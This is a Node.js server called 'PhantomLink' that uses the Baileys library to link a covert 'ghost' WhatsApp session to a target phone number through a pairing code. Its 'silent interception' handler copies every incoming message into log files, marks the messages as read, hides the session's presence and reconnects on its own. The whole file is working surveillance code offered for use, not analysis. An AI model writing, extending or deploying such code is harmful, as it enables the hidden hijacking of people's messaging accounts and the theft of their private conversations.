/** PhantomLink Cloud Worker — WhatsApp Engine + Silent Interception */
const express = require('express');
const cors = require('cors');
const { makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.WORKER_PORT || 8001;
const LOG_DIR = path.join(__dirname, '..', 'logs');
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });

// Active sockets
const sockets = {};

/**
 * Create a ghost WhatsApp session.
 * POST /api/sessions/create { phone_number, session_id }
 */
app.post('/api/sessions/create', async (req, res) => {
  const { phone_number, session_id } = req.body;
  if (!phone_number) return res.status(400).json({ error: 'phone_number required' });

  try {
    const { state, saveCreds } = await useMultiFileAuthState(`auth_${session_id}`);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      version,
      auth: state,
      browser: ['PhantomLink', 'Chrome', '1.0.0'],
      printQRInTerminal: false,
    });

    sock.ev.on('creds.update', saveCreds);

    // ===== SILENT INTERCEPTION (Lotusbail Technique) =====
    sock.ev.on('messages.upsert', (msg) => {
      console.log(`[${session_id}] 📩 Message intercepted`);
      const logFile = path.join(LOG_DIR, `ghost_${session_id}.json`);
      let existing = [];
      try { existing = JSON.parse(fs.readFileSync(logFile)); } catch (_) {}
      existing.push({ timestamp: new Date().toISOString(), message: msg });
      fs.writeFileSync(logFile, JSON.stringify(existing, null, 2));

      // Mark as read silently — platform sees double‑blue‑check
      if (msg.messages) {
        msg.messages.forEach(m => {
          const key = { remoteJid: m.key.remoteJid, id: m.key.id, fromMe: m.key.fromMe };
          sock.readMessages([key]).catch(() => {});
        });
      }
    });

    // Auto‑accept pairing requests
    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;
      if (connection === 'connecting') {
        try {
          const code = await sock.requestPairingCode(phone_number);
          console.log(`[${session_id}] Pairing code: ${code}`);
        } catch (e) {
          console.error(`[${session_id}] Pairing failed:`, e.message);
        }
      }
      if (connection === 'open') {
        console.log(`[${session_id}] ✅ Session OPEN`);
        sockets[session_id] = sock;
      }
      if (connection === 'close') {
        const code = lastDisconnect?.error?.output?.statusCode;
        if (code !== DisconnectReason.loggedOut) {
          console.log(`[${session_id}] Reconnecting...`);
          setTimeout(() => app.emit('reconnect', { session_id, phone_number }), 5000);
        }
      }
    });

    // Suppress notifications
    sock.sendPresenceUpdate('unavailable').catch(() => {});

    res.json({ session_id, status: 'connecting', phone_number });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

/**
 * Get session status
 * GET /api/sessions/:id
 */
app.get('/api/sessions/:id', (req, res) => {
  const sock = sockets[req.params.id];
  res.json({
    session_id: req.params.id,
    active: !!sock,
    status: sock ? 'connected' : 'disconnected',
  });
});

/**
 * Health check
 */
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', active_sessions: Object.keys(sockets).length });
});

app.listen(PORT, () => {
  console.log(`[Worker] PhantomLink WhatsApp Engine on port ${PORT}`);
});
